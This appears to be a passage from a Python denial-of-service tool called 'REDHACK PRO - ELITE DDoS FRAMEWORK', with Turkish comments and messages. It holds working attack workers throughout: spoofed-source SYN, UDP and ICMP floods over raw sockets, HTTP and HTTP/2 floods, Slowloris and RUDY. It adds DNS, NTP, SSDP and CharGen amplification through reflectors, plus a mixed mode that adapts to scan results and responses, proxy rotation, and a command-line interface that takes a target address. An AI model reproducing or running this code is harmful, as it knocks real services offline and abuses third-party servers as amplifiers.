                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                if hasattr(socket, 'SO_REUSEPORT'):
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                self.sockets[proto] = s
            elif proto == socket.IPPROTO_UDP:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                if hasattr(socket, 'SO_REUSEPORT'):
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                self.sockets[proto] = s
            elif proto == socket.IPPROTO_ICMP:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                if hasattr(socket, 'SO_REUSEPORT'):
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                self.sockets[proto] = s
        return self.sockets[proto]

    def _get_connection(self, use_proxy=False, http2=False):
        """Bağlantı havuzundan yeniden kullanılabilir bağlantı al"""
        key = "proxy" if use_proxy else "direct"
        key += "_http2" if http2 else ""
        
        if self.config.current_ip_pool and time.time() - self.config.last_ip_rotation > self.config.ip_rotation_interval:
            self.ip_manager.rotate_ips()
        
        if self.connection_pools[key]:
            return self.connection_pools[key].pop()
            
        try:
            if use_proxy and self.config.current_ip_pool:
                proxy = random.choice(self.config.current_ip_pool)
                proxy_ip, proxy_port = proxy.split(':')
                
                # SOCKS proxy desteği
                if random.random() > 0.5:
                    s = socks.socksocket()
                    s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((proxy_ip, int(proxy_port)))
            else:
                s = socket.create_connection(
                    (self.config.target_ip, self.config.target_port), 
                    timeout=3
                )
            
            if self.config.ssl_enabled:
                context = ssl._create_unverified_context()
                if http2:
                    context.set_alpn_protocols(['h2'])
                s = context.wrap_socket(s, server_hostname=self.config.target_ip)
            
            return s
        except socket.error as e:
            logger.debug(f"Socket hatası: {str(e)}")
            return None
        except ssl.SSLError as e:
            logger.debug(f"SSL hatası: {str(e)}")
            return None
        except Exception as e:
            logger.debug(f"Bağlantı hatası: {str(e)}")
            return None

    def _return_connection(self, conn, use_proxy=False, http2=False):
        """Bağlantıyı havuzuna geri ver"""
        if conn:
            key = "proxy" if use_proxy else "direct"
            key += "_http2" if http2 else ""
            self.connection_pools[key].append(conn)

    # --- SALDIRI ÇALIŞANLARI ---
    def syn_flood_worker(self):
        s = self._get_socket(socket.IPPROTO_TCP)
        while self.running:
            if not self.config.rate_limiter.check_rate('SYN', self.config.packet_per_second):
                time.sleep(0.0001)
                continue
            
            try:
                src_ip = random.choice(self.config.spoofed_ips)
                packet = PacketEngine.syn_packet(
                    src_ip, 
                    self.config.target_ip,
                    self.config.target_port,
                    self.config
                )
                s.sendto(packet, (self.config.target_ip, 0))
                self._update_stats(True)
            except socket.error as e:
                logger.debug(f"SYN gönderme hatası: {str(e)}")
                self._update_stats(False)
            except Exception as e:
                logger.error(f"Beklenmeyen SYN hatası: {str(e)}", exc_info=True)
                self._update_stats(False)

    def udp_flood_worker(self):
        s = self._get_socket(socket.IPPROTO_UDP)
        while self.running:
            if not self.config.rate_limiter.check_rate('UDP', self.config.packet_per_second):
                time.sleep(0.0001)
                continue
            
            try:
                src_ip = random.choice(self.config.spoofed_ips)
                packet = PacketEngine.udp_packet(
                    src_ip,
                    self.config.target_ip,
                    self.config.target_port,
                    random.randint(64, 1024),
                    self.config
                )
                s.sendto(packet, (self.config.target_ip, 0))
                self._update_stats(True)
            except socket.error as e:
                logger.debug(f"UDP gönderme hatası: {str(e)}")
                self._update_stats(False)
            except Exception as e:
                logger.error(f"Beklenmeyen UDP hatası: {str(e)}", exc_info=True)
                self._update_stats(False)

    def icmp_flood_worker(self):
        s = self._get_socket(socket.IPPROTO_ICMP)
        while self.running:
            if not self.config.rate_limiter.check_rate('ICMP', self.config.packet_per_second):
                time.sleep(0.0001)
                continue
            
            try:
                src_ip = random.choice(self.config.spoofed_ips)
                packet = PacketEngine.icmp_packet(
                 src_ip,
                  self.config.target_ip,
                 config=self.config,
                 payload_size=random.randint(64, 1024)
                 )


                s.sendto(packet, (self.config.target_ip, 0))
                self._update_stats(True)
            except socket.error as e:
                logger.debug(f"ICMP gönderme hatası: {str(e)}")
                self._update_stats(False)
            except Exception as e:
                logger.error(f"Beklenmeyen ICMP hatası: {str(e)}", exc_info=True)
                self._update_stats(False)

    def http_flood_worker(self):
        while self.running:
            if not self.config.rate_limiter.check_rate('HTTP', self.config.packet_per_second // 10):
                time.sleep(0.0001)
                continue
            
            try:
                use_proxy = random.random() > 0.7 and self.config.current_ip_pool
                http2 = self.config.http2_enabled and random.random() > 0.5
                conn = self._get_connection(use_proxy, http2)
                if not conn:
                    self._update_stats(False)
                    continue
                
                for _ in range(random.randint(10, 100)):
                    if http2:
                        packet = PacketEngine.http2_flood_packet(self.config)
                    else:
                        packet = PacketEngine.http_flood_packet(self.config)
                    
                    try:
                        conn.sendall(packet)
                        self._update_stats(True)
                    except socket.error as e:
                        logger.debug(f"HTTP gönderme hatası: {str(e)}")
                        self._update_stats(False)
                        break
                    except ssl.SSLError as e:
                        logger.debug(f"SSL hatası: {str(e)}")
                        self._update_stats(False)
                        break
                
                self._return_connection(conn, use_proxy, http2)
            except Exception as e:
                logger.error(f"Beklenmeyen HTTP hatası: {str(e)}", exc_info=True)
                self._update_stats(False)

    def slowloris_worker(self):
        while self.running:
            if not self.config.rate_limiter.check_rate('SLOWLORIS', self.config.packet_per_second // 20):
                time.sleep(0.0001)
                continue
            
            try:
                use_proxy = random.random() > 0.7 and self.config.current_ip_pool
                conn = self._get_connection(use_proxy)
                if not conn:
                    self._update_stats(False)
                    continue
                
                # Bağlantıyı açık tut
                packet = PacketEngine.slowloris_packet(self.config)
                conn.send(packet)
                self._update_stats(True)
                
                # Yavaşça başlık gönder
                while self.running and random.random() > 0.1:
                    time.sleep(random.uniform(5, 30))
                    conn.send(b"X-a: b\r\n")
                    self._update_stats(True)
                
                self._return_connection(conn, use_proxy)
            except Exception as e:
                logger.debug(f"Slowloris hatası: {str(e)}")
                self._update_stats(False)

    def rudy_worker(self):
        while self.running:
            if not self.config.rate_limiter.check_rate('RUDY', self.config.packet_per_second // 20):
                time.sleep(0.0001)
                continue
            
            try:
                use_proxy = random.random() > 0.7 and self.config.current_ip_pool
                conn = self._get_connection(use_proxy)
                if not conn:
                    self._update_stats(False)
                    continue
                
                # Başlıkları gönder
                packet = PacketEngine.rudy_packet(self.config)
                conn.send(packet)
                self._update_stats(True)
                
                # Yavaşça body gönder
                while self.running and random.random() > 0.1:
                    time.sleep(random.uniform(10, 60))
                    conn.send(b"." * random.randint(1, 10))
                    self._update_stats(True)
                
                self._return_connection(conn, use_proxy)
            except Exception as e:
                logger.debug(f"RUDY hatası: {str(e)}")
                self._update_stats(False)

    def dns_amplification_worker(self):
        dns_query = PacketEngine.dns_amplification_packet(
            self.config.target_ip,
            self.config.amplification_factor
        )
        
        while self.running:
            if not self.config.rate_limiter.check_rate('DNS', self.config.packet_per_second):
                time.sleep(0.0001)
                continue
            
            try:
                dns_server = random.choice(self.dns_servers)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(0.5)
                s.sendto(dns_query, (dns_server, 53))
                s.close()
                self._update_stats(True)
            except socket.error as e:
                logger.debug(f"DNS gönderme hatası: {str(e)}")
                self._update_stats(False)
            except Exception as e:
                logger.error(f"Beklenmeyen DNS hatası: {str(e)}", exc_info=True)
                self._update_stats(False)

    def ntp_amplification_worker(self):
        ntp_query = PacketEngine.ntp_amplification_packet()
        
        while self.running:
            if not self.config.rate_limiter.check_rate('NTP', self.config.packet_per_second):
                time.sleep(0.0001)
                continue
            
            try:
                ntp_server = random.choice(self.config.ntp_servers)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(0.5)
                s.sendto(ntp_query, (ntp_server, 123))
                s.close()
                self._update_stats(True)
            except socket.error as e:
                logger.debug(f"NTP gönderme hatası: {str(e)}")
                self._update_stats(False)
            except Exception as e:
                logger.error(f"Beklenmeyen NTP hatası: {str(e)}", exc_info=True)
                self._update_stats(False)

    def ssdp_amplification_worker(self):
        while self.running:
            if not self.config.rate_limiter.check_rate('SSDP', self.config.packet_per_second):
                time.sleep(0.0001)
                continue
            
            try:
                ssdp_server = random.choice(self.config.ssdp_servers)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(0.5)
                packet = PacketEngine.ssdp_amplification_packet(ssdp_server)
                s.sendto(packet, (ssdp_server, 1900))
                s.close()
                self._update_stats(True)
            except socket.error as e:
                logger.debug(f"SSDP gönderme hatası: {str(e)}")
                self._update_stats(False)
            except Exception as e:
                logger.error(f"Beklenmeyen SSDP hatası: {str(e)}", exc_info=True)
                self._update_stats(False)

    def chargen_amplification_worker(self):
        chargen_query = PacketEngine.chargen_amplification_packet()
        
        while self.running:
            if not self.config.rate_limiter.check_rate('CHARGEN', self.config.packet_per_second):
                time.sleep(0.0001)
                continue
            
            try:
                chargen_server = random.choice(self.config.chargen_servers)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(0.5)
                s.sendto(chargen_query, (chargen_server, 19))
                s.close()
                self._update_stats(True)
            except socket.error as e:
                logger.debug(f"CharGen gönderme hatası: {str(e)}")
                self._update_stats(False)
            except Exception as e:
                logger.error(f"Beklenmeyen CharGen hatası: {str(e)}", exc_info=True)
                self._update_stats(False)

    def mixed_attack_worker(self):
        """Çoklu saldırı vektörlerini entegre eden hibrit çalışan"""
        workers = {
            'syn': self.syn_flood_worker,
            'http': self.http_flood_worker,
            'slowloris': self.slowloris_worker,
            'rudy': self.rudy_worker,
            'dns': self.dns_amplification_worker,
            'udp': self.udp_flood_worker,
            'icmp': self.icmp_flood_worker,
            'ntp': self.ntp_amplification_worker,
            'ssdp': self.ssdp_amplification_worker,
            'chargen': self.chargen_amplification_worker
        }
        
        # Başlangıç ağırlıkları
        weights = {
            'syn': 0.15,
            'http': 0.2,
            'slowloris': 0.1,
            'rudy': 0.1,
            'dns': 0.1,
            'udp': 0.1,
            'icmp': 0.1,
            'ntp': 0.05,
            'ssdp': 0.05,
            'chargen': 0.05
        }
        
        # Hedef bilgisine göre optimize et
        if self.config.target_info:
            if any(s['service'] == 'http' for s in self.config.target_info['protocols'].get('tcp', [])):
                weights['http'] = 0.3
                weights['slowloris'] = 0.15
                weights['rudy'] = 0.15
                weights['syn'] = 0.1
            
            if any(s['service'] == 'domain' for s in self.config.target_info['protocols'].get('udp', [])):
                weights['dns'] = 0.2
                weights['udp'] = 0.05
                
            if any(s['service'] == 'ntp' for s in self.config.target_info['protocols'].get('udp', [])):
                weights['ntp'] = 0.15
                
            if any(s['service'] == 'upnp' for s in self.config.target_info['protocols'].get('udp', [])):
                weights['ssdp'] = 0.1
                
            if any(s['service'] == 'chargen' for s in self.config.target_info['protocols'].get('udp', [])):
                weights['chargen'] = 0.1
        
        # Yanıt oranına göre dinamik ayarlama
        if self.config.feedback_based:
            if self.stats['response_rate'] < self.config.response_threshold:
                # Hedef yanıt vermiyor, amplifikasyonu artır
                weights['dns'] = min(0.3, weights['dns'] * 1.5)
                weights['ntp'] = min(0.3, weights['ntp'] * 1.5)
                weights['ssdp'] = min(0.2, weights['ssdp'] * 1.5)
                weights['chargen'] = min(0.2, weights['chargen'] * 1.5)
            else:
                # Hedef yanıt veriyor, HTTP/SYN artır
                weights['http'] = min(0.4, weights['http'] * 1.3)
                weights['syn'] = min(0.2, weights['syn'] * 1.2)
                weights['slowloris'] = min(0.2, weights['slowloris'] * 1.2)
                weights['rudy'] = min(0.2, weights['rudy'] * 1.2)
        
        while self.running:
            attack_type = random.choices(
                list(workers.keys()), 
                weights=list(weights.values()),
                k=1
            )[0]
            workers[attack_type]()

    # --- SALDIRI YÖNETİMİ ---
    def start(self):
        """Saldırıyı başlat"""
        logger.info(f"### SALDIRI BAŞLATILIYOR ###")
        logger.info(f"Hedef: {self.config.target_ip}:{self.config.target_port}")
        logger.info(f"Tür: {self.config.attack_type}")
        logger.info(f"Süre: {self.config.attack_duration}s")
        logger.info(f"Yoğunluk: {self.config.intensity}/10")
        logger.info(f"Thread: {self.config.thread_count}")
        logger.info(f"Paket/sn: {self.config.packet_per_second}")
        logger.info(f"Proxy: {len(self.config.proxy_list)}")
        logger.info(f"Şifreli Paket: {'AÇIK' if self.config.encrypted_packets else 'KAPALI'}")
        logger.info(f"Sıkıştırma: {'AÇIK' if self.config.packet_compression else 'KAPALI'}")
        logger.info(f"Tünelleme: {'AÇIK' if self.config.tunneling_enabled else 'KAPALI'}")
        logger.info(f"Polimorfik Paketler: {'AÇIK' if self.config.polymorphic_packets else 'KAPALI'}")
        logger.info(f"HTTP/2: {'AÇIK' if self.config.http2_enabled else 'KAPALI'}")
        logger.info(f"WAF Tespiti: {'EVET' if self.config.waf_detected else 'HAYIR'}")
        logger.info(f"CDN Tespiti: {'EVET' if self.config.cdn_detected else 'HAYIR'}")
        logger.info(f"Güvenlik Sistemleri: {', '.join(self.config.detected_security) if self.config.detected_security else 'Tespit edilmedi'}")
        
        workers = {
            "SYN": self.syn_flood_worker,
            "HTTP": self.http_flood_worker,
            "SLOWLORIS": self.slowloris_worker,
            "RUDY": self.rudy_worker,
            "DNS": self.dns_amplification_worker,
            "UDP": self.udp_flood_worker,
            "ICMP": self.icmp_flood_worker,
            "NTP": self.ntp_amplification_worker,
            "SSDP": self.ssdp_amplification_worker,
            "CHARGEN": self.chargen_amplification_worker,
            "MIXED": self.mixed_attack_worker
        }
        
        worker_func = workers.get(self.config.attack_type, self.mixed_attack_worker)
        
        try:
            with ThreadPoolExecutor(max_workers=self.config.thread_count) as executor:
                # Tüm thread'leri başlat
                futures = [executor.submit(worker_func) for _ in range(self.config.thread_count)]
                
                # Süre kontrolü
                start_time = time.time()
                while time.time() - start_time < self.config.attack_duration and self.running:
                    time.sleep(0.5)
                    
                    # Saldırı aşamasını güncelle
                    self.update_attack_stage(start_time)
                    
                    # Ara istatistik
                    elapsed = time.time() - start_time
                    remaining = max(0, self.config.attack_duration - elapsed)
                    if int(elapsed) % 10 == 0:
                        logger.info(f"Saldırı devam ediyor: {int(elapsed)}s / Kalan: {int(remaining)}s / Aşama: {self.config.attack_stage}")
                
                # Saldırıyı durdur
                self.running = False
                self.response_monitor.stop()
                
                # Thread'lerin bitmesini bekle
                for future in futures:
                    future.cancel()
        
        except KeyboardInterrupt:
            self.running = False
            self.response_monitor.stop()
            logger.info("Saldırı kullanıcı tarafından durduruldu")
        except socket.error as e:
            logger.critical(f"Socket hatası: {str(e)}")
        except ssl.SSLError as e:
            logger.critical(f"SSL hatası: {str(e)}")
        except Exception as e:
            logger.critical(f"KRİTİK SALDIRI HATASI: {str(e)}", exc_info=True)
        finally:
            # Kaynakları temizle
            for s in self.sockets.values():
                try:
                    s.close()
                except:
                    pass
                    
            for pool in self.connection_pools.values():
                for conn in pool:
                    try:
                        conn.close()
                    except:
                        pass
            
            total_time = time.time() - self.stats['start_time']
            logger.info(f"### SALDIRI TAMAMLANDI ###")
            logger.info(f"Toplam Süre: {total_time:.2f}s")
            logger.info(f"Toplam Paket: {self.stats['successful'] + self.stats['failed']}")
            logger.info(f"Başarılı: {self.stats['successful']}")
            logger.info(f"Başarısız: {self.stats['failed']}")

    def update_attack_stage(self, start_time):
        """Saldırı aşamasını güncelle"""
        elapsed = time.time() - start_time
        
        # Çok aşamalı saldırı planı
        if elapsed < self.config.stage_duration:
            new_stage = "RECON"
        elif elapsed < self.config.stage_duration * 2:
            new_stage = "VOLUME"
        elif elapsed < self.config.stage_duration * 3:
            new_stage = "APP_LAYER"
        else:
            new_stage = "VECTOR_ROTATION"
        
        if new_stage != self.config.attack_stage:
            self.config.attack_stage = new_stage
            logger.warning(f"SALDIRI AŞAMASI DEĞİŞTİ: {new_stage}")
            
            # Aşamaya özgü ayarlar
            if new_stage == "VOLUME":
                self.config.packet_per_second = int(self.config.packet_per_second * 1.5)
            elif new_stage == "APP_LAYER":
                self.config.http2_enabled = True
                self.config.vector_rotation = True
            elif new_stage == "VECTOR_ROTATION":
                self.config.ip_rotation_interval = 10
                self.config.vector_rotation = True

# --- YANIT İZLEME MODÜLÜ ---
class ResponseMonitor:
    def __init__(self, config, attack_core):
        self.config = config
        self.attack_core = attack_core
        self.running = True
        self.responses = 0
        self.errors = 0
        self.total = 0
        self.lock = threading.Lock()
        self.socket = None
        self.thread = threading.Thread(target=self.monitor, daemon=True)
        
    def start(self):
        self.thread.start()
        
    def stop(self):
        self.running = False
        if self.socket:
            self.socket.close()
            
    def monitor(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self.socket.settimeout(1)
            
            while self.running:
                try:
                    data, addr = self.socket.recvfrom(1024)
                    if addr[0] == self.config.target_ip:
                        with self.lock:
                            self.responses += 1
                            self.total += 1
                except socket.timeout:
                    continue
                except socket.error as e:
                    logger.debug(f"Yanıt izleme hatası: {str(e)}")
                    time.sleep(1)
                
                # Her 5 saniyede bir istatistikleri güncelle
                if time.time() % 5 < 0.1:
                    with self.lock:
                        response_rate = self.responses / self.total if self.total > 0 else 0
                        error_rate = self.errors / self.total if self.total > 0 else 0
                        
                        # Saldırı çekirdeğine yanıt oranını güncelle
                        with self.attack_core.lock:
                            self.attack_core.stats['response_rate'] = response_rate
                            self.attack_core.stats['error_rate'] = error_rate
                            
                        # Makine öğrenimi adaptasyonu
                        if self.config.ml_model_enabled:
                            self.attack_core.ml_adaptation(response_rate, error_rate)
                            
                        # Sıfırla
                        self.responses = 0
                        self.errors = 0
                        self.total = 0
                        
                        logger.debug(f"Yanıt Oranı: {response_rate:.2f}, Hata Oranı: {error_rate:.2f}")
        except Exception as e:
            logger.error(f"Yanıt izleme hatası: {str(e)}")

# --- KOMUT SATIRI ARAYÜZÜ ---
def print_banner():
    print("""
    ██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗
    ██╔══██╗██╔════╝██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝
    ██████╔╝█████╗  ██║  ██║███████║███████║██║     █████╔╝ 
    ██╔══██╗██╔══╝  ██║  ██║██╔══██║██╔══██║██║     ██╔═██╗ 
    ██║  ██║███████╗██████╔╝██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    REDHACK PRO - ELITE DDoS FRAMEWORK v5.0
    """)

# --- ANA KONTROL ---
if __name__ == "__main__":
    try:
        print_banner()
        config = AttackConfig()
        
        if len(sys.argv) < 3:
            print(f"Kullanım: {sys.argv[0]} <hedef_ip> <hedef_port> [saldırı_türü] [süre] [yoğunluk] [şifreleme] [sıkıştırma] [tünelleme] [http2]")
            print("Saldırı türleri: SYN, HTTP, SLOWLORIS, RUDY, DNS, UDP, ICMP, NTP, SSDP, CHARGEN, MIXED")
            print("Yoğunluk: 1-10 arası (varsayılan: 8)")
            print("Şifreleme: ENCRYPT (varsayılan: KAPALI)")
            print("Sıkıştırma: COMPRESS (varsayılan: KAPALI)")
            print("Tünelleme: TUNNEL (varsayılan: KAPALI)")
            print("HTTP/2: HTTP2 (varsayılan: KAPALI)")
            print("Örnek: sudo python3 redhack.py 192.168.1.100 80 MIXED 300 9 ENCRYPT COMPRESS TUNNEL HTTP2")
            sys.exit(1)
        
        # Parametreleri ayarla
        config.target_ip = sys.argv[1]
        config.target_port = int(sys.argv[2])
        config.attack_type = sys.argv[3].upper() if len(sys.argv) > 3 else "MIXED"
        config.attack_duration = int(sys.argv[4]) if len(sys.argv) > 4 else 600
        config.intensity = int(sys.argv[5]) if len(sys.argv) > 5 else 8
        config.encrypted_packets = len(sys.argv) > 6 and sys.argv[6].upper() == "ENCRYPT"
        config.packet_compression = len(sys.argv) > 7 and sys.argv[7].upper() == "COMPRESS"
        config.tunneling_enabled = len(sys.argv) > 8 and sys.argv[8].upper() == "TUNNEL"
        config.http2_enabled = len(sys.argv) > 9 and sys.argv[9].upper() == "HTTP2"
        
        # Proxy listesi
        try:
            with open("proxy.txt", "r") as f:
                config.proxy_list = [line.strip() for line in f if line.strip()]
                logger.info(f"{len(config.proxy_list)} proxy yüklendi")
        except IOError:
            logger.warning("Proxy listesi bulunamadı, direkt bağlantı kullanılacak")
        
        # Validasyon
        config.validate()
        
        # Saldırıyı başlat
        engine = AttackCore(config)
        engine.start()
        
    except KeyboardInterrupt:
        logger.info("\nSaldırı kullanıcı tarafından durduruldu")
        sys.exit(0)
    except socket.error as e:
        logger.critical(f"Socket hatası: {str(e)}")
        sys.exit(1)
    except ssl.SSLError as e:
        logger.critical(f"SSL hatası: {str(e)}")
        sys.exit(1)
    except Exception as e:
        logger.critical(f"KRİTİK BAŞLATMA HATASI: {str(e)}", exc_info=True)
        sys.exit(1)